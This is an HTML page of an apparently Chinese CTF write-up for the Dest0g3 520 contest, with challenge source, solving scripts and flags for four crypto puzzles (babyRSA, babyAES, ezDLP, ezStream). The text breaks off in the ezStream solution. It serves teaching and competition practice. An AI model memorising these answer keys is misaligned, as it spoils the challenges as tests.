

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/banner/piano_man.png">
  <link rel="icon" href="/banner/piano_man.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lanpesk">
  <meta name="keywords" content="">
  
    <meta name="description" content="BUU的Dest0g3 520迎新赛。babyRSA、babyAES、ezDLP、ezStream、Mr.Doctor、Pngenius、EasyEncode、你知道js吗、EasyWord、Python_jail、 4096、simpleXOR、hi 、 ez_arrch的题解。">
<meta property="og:type" content="article">
<meta property="og:title" content="Dest0g3 520迎新赛">
<meta property="og:url" content="http://example.com/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/index.html">
<meta property="og:site_name" content="lanpesk">
<meta property="og:description" content="BUU的Dest0g3 520迎新赛。babyRSA、babyAES、ezDLP、ezStream、Mr.Doctor、Pngenius、EasyEncode、你知道js吗、EasyWord、Python_jail、 4096、simpleXOR、hi 、 ez_arrch的题解。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg">
<meta property="og:image" content="https://s2.loli.net/2022/05/26/NlDXTEFbQ5tzogG.jpg">
<meta property="og:image" content="https://s2.loli.net/2022/05/26/hZJM13C4yniNSmu.jpg">
<meta property="article:published_time" content="2022-05-27T04:07:03.000Z">
<meta property="article:modified_time" content="2022-05-28T02:27:37.743Z">
<meta property="article:author" content="lanpesk">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="MISC">
<meta property="article:tag" content="Reverse， PWN， Web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg">
  
  
  <title>Dest0g3 520迎新赛 - lanpesk</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>lanpesk</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://s2.loli.net/2022/05/01/YwbfzI9vkWMaVc2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Dest0g3 520迎新赛">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-05-27 12:07" pubdate>
        2022年5月27日 中午
      </time>
    </span>
  
</div>

<div class="mt-1">
  

  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Dest0g3 520迎新赛</h1>
            
            <div class="markdown-body">
              <p>BUU的Dest0g3 520迎新赛。babyRSA、babyAES、ezDLP、ezStream、Mr.Doctor、Pngenius、EasyEncode、你知道js吗、EasyWord、Python_jail、 4096、simpleXOR、hi 、 ez_arrch的题解。</p>
<span id="more"></span>
<img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" srcset="/img/loading.gif" lazyload style="zoom: 33%;" />
<p>保住了前100，累死了都。</p>
<p>最后主办方清了一波作弊的，完赛后来看我直接70以内了。属实乐。</p>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2>
<figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = next_prime(p)<br>n = p*q<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br><span class="hljs-string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
<p>p,q使用的是相邻的两个素数。所以可以进行开方求解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyRSA_solve.py</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br>c = <span class="hljs-number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br>p =  sympy.prevprime(gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>q = sympy.nextprime(p)<br><br>d = gmpy2.invert(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = gmpy2.powmod(c, d, n)<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment"># Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>key = os.urandom(<span class="hljs-number">16</span>)<br>my_aes = AES.new(key, AES.MODE_CBC, iv)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag += (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">16</span>) * <span class="hljs-string">b&#x27;\x00&#x27;</span><br>c = my_aes.encrypt(flag)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(iv)<br><span class="hljs-built_in">print</span>(key)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span><br><span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span><br><span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
<p>可以看到初始向量和加密密钥都给出来了，直接进行解密就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyAES_solve.py</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><br>aes = AES.new(<span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span>, AES.MODE_CBC, <span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(aes.decrypt(<span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>x = bytes_to_long(flag)<br>g = <span class="hljs-number">19</span><br>p = <span class="hljs-number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br>h = <span class="hljs-built_in">pow</span>(g, x, p)<br><span class="hljs-built_in">print</span>(h)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
<p>用SageMath求解即可。这个只能这么做了，用到应该是BSGS算法，我自己写的跑半天跑不出来，还是用SageMath好了。</p>
<p><a target="_blank" rel="noopener" href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SageMath"># sagemath<br>h = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162<br>p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353<br>g = 19<br>x = discrete_log(mod(h, p), mod(g, p))<br>print(hex(x))<br><br># 0x446573743067337b30376564326136662d313832662d613035642d633831652d3133313861663832306137387d<br># Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;<br></code></pre></td></tr></table></figure>
<h2 id="ezstream"><a class="markdownIt-Anchor" href="#ezstream"></a> ezStream</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>flag = f.read()<br>f.close()<br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">8</span>] == <span class="hljs-string">&quot;Dest0g3&#123;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.b = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.m = getPrime(<span class="hljs-number">32</span>)<br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>lcg = LCG()<br>lcg.output()<br>c = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="hljs-built_in">ord</span>(flag[i]) ^ (lcg.<span class="hljs-built_in">next</span>() % <span class="hljs-number">10</span>))<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(c))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 3939333498</span><br><span class="hljs-string">b = 3662432446</span><br><span class="hljs-string">m = 2271373817</span><br><span class="hljs-string">state1 = 17362</span><br><span class="hljs-string">state2 = 20624</span><br><span class="hljs-string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
<p>流加密，看样子要找seed的初值。而且给了一部分的明文，可以求密钥流。</p>
<p>随机数是用getRandomNBitInteger(32)生成的。那么seed的范围就是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。选择爆破来求解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">3939333498</span><br>        self.b = <span class="hljs-number">3662432446</span><br>        self.m = <span class="hljs-number">2271373817</span><br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(<span class="hljs-number">32</span>-<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**<span class="hljs-number">32</span> -<span class="hljs-number">1</span>):<br>    lcg.seed = seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">17362</span>:<br>        <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>            lcg.seed = seed<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed = &quot;</span>, seed)<br>            <span class="hljs-keyword">break</span><br><br>lcg.<span class="hljs-built_in">next</span>()<br>lcg.<span class="hljs-built_in">next</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br><br><span class="hljs-comment"># seed =  2376358340</span><br><span class="hljs-comment"># 